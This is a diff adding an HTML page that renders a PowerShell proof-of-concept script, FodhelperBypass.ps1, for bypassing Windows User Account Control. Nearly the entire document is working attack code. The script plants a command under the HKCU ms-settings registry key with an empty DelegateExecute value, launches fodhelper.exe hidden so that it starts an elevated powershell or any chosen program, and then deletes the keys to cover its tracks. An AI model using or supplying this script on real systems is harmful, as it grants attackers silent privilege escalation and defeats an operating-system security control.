@@ -1,0 +1,57 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>FodhelperBypass.ps1</title>
+</head><body>&lt;#<br/>
+.SYNOPSIS &nbsp;<br/>
+&nbsp; &nbsp; This script is a proof of concept to bypass the User Access Control (UAC) via fodhelper.exe<br/>
+<br/>
+&nbsp; &nbsp; It creates a new registry structure in: "HKCU:\Software\Classes\ms-settings\" to perform an UAC bypass to start any application. <br/>
+&nbsp; &nbsp; <br/>
+&nbsp; &nbsp; ATTENTION: Do not try this on your productive machine! <br/>
+<br/>
+<br/>
+.NOTES &nbsp;<br/>
+&nbsp; &nbsp; Function &nbsp; : FodhelperBypass<br/>
+&nbsp; &nbsp; File Name &nbsp;: FodhelperBypass.ps1 <br/>
+&nbsp; &nbsp; Author &nbsp; &nbsp; : Christian B. - winscripting.blog <br/>
+<br/>
+<br/>
+.LINK &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; https://github.com/winscripting/UAC-bypass<br/>
+<br/>
+.EXAMPLE &nbsp;<br/>
+<br/>
+&nbsp; &nbsp; &nbsp;Load "cmd.exe /c powershell.exe" (it's default):<br/>
+&nbsp; &nbsp; &nbsp;FodhelperBypass <br/>
+<br/>
+&nbsp; &nbsp; &nbsp;Load specific application:<br/>
+&nbsp; &nbsp; &nbsp;FodhelperBypass -program "cmd.exe"<br/>
+&nbsp; &nbsp; &nbsp;FodhelperBypass -program "cmd.exe /c powershell.exe"<br/>
+&nbsp; &nbsp; &nbsp;<br/>
+<br/>
+#&gt;<br/>
+<br/>
+function FodhelperBypass(){ <br/>
+&nbsp;Param (<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [String]$program = "cmd /c start powershell.exe" #default<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;)<br/>
+<br/>
+&nbsp; &nbsp; #Create registry structure<br/>
+&nbsp; &nbsp; New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force<br/>
+&nbsp; &nbsp; New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force<br/>
+&nbsp; &nbsp; Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force<br/>
+<br/>
+&nbsp; &nbsp; #Perform the bypass<br/>
+&nbsp; &nbsp; Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden<br/>
+<br/>
+&nbsp; &nbsp; #Remove registry structure<br/>
+&nbsp; &nbsp; Start-Sleep 3<br/>
+&nbsp; &nbsp; Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force<br/>
+<br/>
+}<br/>
+<br/>
+</body></html>
